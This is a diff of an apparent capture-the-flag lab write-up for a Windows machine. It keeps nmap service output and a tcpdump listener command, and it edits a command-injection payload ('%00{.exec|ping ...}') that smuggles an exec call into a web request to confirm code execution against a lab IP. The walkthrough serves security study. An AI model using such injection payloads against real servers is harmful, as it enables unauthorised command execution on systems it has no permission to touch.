@@ -46,8 +46,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ▶ tcpdump -i tun0
 ```
 ```CSS
-%00{.exec|ping 10.10.14.21}
+%00{.exec|ping 10.10.14.21.}
 ```
-![image](https://user-images.githubusercontent.com/83878909/236134824-7ede621a-4d15-4b12-adb4-a5001dca25b0.png)
-
+![image](https://user-images.githubusercontent.com/83878909/236135355-c044f521-5cea-4d4c-abb3-95aafa954d6c.png)
 ![image](https://user-images.githubusercontent.com/83878909/236134669-802324a7-fbd7-4cf3-9cd8-6bc4c8336c04.png)
